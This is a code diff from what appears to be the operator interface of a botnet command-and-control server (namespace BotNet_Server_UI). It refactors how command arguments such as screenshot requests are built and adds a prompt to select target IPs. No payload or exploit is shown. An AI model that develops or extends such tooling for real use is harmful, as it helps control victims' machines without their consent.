@@ -19,27 +19,40 @@ namespace BotNet_Server_UI
     {
         public bool ipsall;
         public string[] ips;
-        TextBox[] args = new TextBox[0];
+        dynamic[] args = new dynamic[0];
+        string argtype = null;
         public MainWindow()
         {
             InitializeComponent();
         }
 
-        private async void Send_Command()
+        public async void Send_Command()
         {
             if (Command.Text == "")
             {
                 MessageBox.Show("Постарайтесь ввести все значения правильно!");
                 return;
             }
+            if (!ipsall)
+            {
+                if (ips == null)
+                {
+                    IPSet iPSet = new IPSet(true);
+                    iPSet.Show();
+                    return;
+                }
+            }
             try
             {
                 string showcommand = Command.Text;
                 string command = Command.Text;
-                for (int i = 0; i < args.Length; i++)
+                if (argtype == "TextBox")
                 {
-                    showcommand += " " + args[i].Text;
-                    command += "^" + args[i].Text;
+                    for (int i = 0; i < args.Length; i++)
+                    {
+                        showcommand += " " + args[i].Text;
+                        command += "^" + args[i].Text;
+                    }
                 }
                 Message message = new Message()
                 {
@@ -176,34 +189,42 @@ namespace BotNet_Server_UI
             {
                 if (Command.Text == Arguments.arguments[i].Command)
                 {
-                    if (Command.Text == "/screen")
+                    argtype = Arguments.arguments[i].ArgumentType;
+                    if (argtype == "TextBox")
                     {
-                        Button button = new Button()
-                        {
-                            Content = "Открыть скриншот панель",
-                            HorizontalAlignment = HorizontalAlignment.Stretch,
-                            VerticalAlignment = VerticalAlignment.Bottom,
-                            Margin = new Thickness(10, 10, 10, 18)
-                        };
-                        button.SetValue(Grid.ColumnProperty, 2);
-                        button.SetValue(Grid.RowProperty, 2);
-                        Grid.Children.Add(button);
-                        button.Click += Button_Click1;
+                        args = new TextBox[Arguments.arguments[i].ArgumentCount];
                     }
-                    args = new TextBox[Arguments.arguments[i].ArgumentCount];
+                    else if (argtype == "Button")
+                    {
+                        args = new Button[Arguments.arguments[i].ArgumentCount];
+                    }
                     for (int j = 0, k = Arguments.arguments[i].ArgumentCount; j < Arguments.arguments[i].ArgumentCount; j++)
                     {
-                        args[j] = new TextBox()
+                        if (Arguments.arguments[i].ArgumentType == "TextBox")
                         {
-                            Name = $"Argument{j + 1}",
-                            TextWrapping = TextWrapping.NoWrap,
-                            HorizontalAlignment = HorizontalAlignment.Stretch,
-                            Margin = new Thickness(10 + j * (270 / Arguments.arguments[i].ArgumentCount), 10, 10 + --k * (270 / Arguments.arguments[i].ArgumentCount), 18),
-                        };
+                            args[j] = new TextBox()
+                            {
+                                Name = $"Argument{j + 1}",
+                                TextWrapping = TextWrapping.NoWrap,
+                                HorizontalAlignment = HorizontalAlignment.Stretch,
+                                Margin = new Thickness(10 + j * (270 / Arguments.arguments[i].ArgumentCount), 10, 10 + --k * (270 / Arguments.arguments[i].ArgumentCount), 18),
+                            };
+                            args[j].KeyDown += new KeyEventHandler(Command_KeyDown);
+                        }
+                        else if (Arguments.arguments[i].ArgumentType == "Button")
+                        {
+                            args[j] = new Button()
+                            {
+                                Content = Arguments.arguments[i].ArgumentsList[j],
+                                HorizontalAlignment = HorizontalAlignment.Stretch,
+                                VerticalAlignment = VerticalAlignment.Bottom,
+                                Margin = new Thickness(10, 10, 10, 18)
+                            };
+                            args[j].Click += new RoutedEventHandler(Button_Click1);
+                        }
                         args[j].SetValue(Grid.ColumnProperty, 2);
                         args[j].SetValue(Grid.RowProperty, 2);
                         Grid.Children.Add(args[j]);
-                        args[j].KeyDown += Command_KeyDown;
                     }
                     return;
                 }
